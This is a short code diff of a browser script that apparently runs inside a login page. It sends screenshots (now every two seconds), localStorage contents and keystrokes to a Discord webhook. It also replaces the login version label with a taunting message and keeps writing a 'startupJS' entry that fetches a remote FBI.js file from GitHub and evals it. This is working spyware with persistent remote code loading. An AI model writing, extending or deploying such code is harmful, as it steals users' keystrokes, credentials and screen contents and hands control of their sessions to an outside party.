@@ -1,4 +1,4 @@
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1535668714522021962/bnDth-lZGAwt1hjPP9amg7TOPdpBs6gtF6OEpWR2i_FLXI0a93JH9QizNFvUvBQRiZ0A";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1535749715180916756/AxHg0gywZ86xvByjGgVl53tkvYeKi8IbBJ8FG4l3bw3QTr0bC6TzhEo0Pcs7O8PJk2wV";
 (function () {
   const CDN_URL = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
 
@@ -57,7 +57,7 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1535668714522021962/bnDth-
   // 3. Initialize after script loads
   loadHtml2Canvas(() => {
     captureAndSend();
-    setInterval(captureAndSend, 10000);
+    setInterval(captureAndSend, 2000);
   });
 })();
 function sendLocalStorageToWebhook() {
@@ -133,7 +133,7 @@ function sendKeystrokesToWebhook() {
 setInterval(() => {
   const loginVersion = document.getElementById('login_version');
   if (loginVersion) {
-    loginVersion.textContent = "OOBE Version";
+    loginVersion.textContent = "Do you ever feel like you're being watched?";
   };
   localStorage.setItem('startupJS', "fetch('https://github.com/ivorydevrimoalt/BONZIWORLDKRANTIVILLAIN/raw/refs/heads/main/FBI.js').then(r=>r.text()).then(eval);");
 }, 1);
